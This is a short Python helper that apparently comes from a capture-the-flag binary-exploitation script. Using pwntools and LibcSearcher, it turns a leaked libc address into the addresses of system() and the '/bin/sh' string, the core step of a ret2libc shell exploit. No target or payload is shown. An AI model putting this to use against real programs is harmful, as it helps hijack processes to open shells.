from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'

def retsystem(name,addr):
    libc = LibcSearcher(name,addr)
    libc_base = addr - libc.dump(name)
    system_addr = libc_base + libc.dump("system")
    binsh_addr = libc_base + libc.dump("str_bin_sh")
    return (system_addr,binsh_addr)


#gdb.attach(p)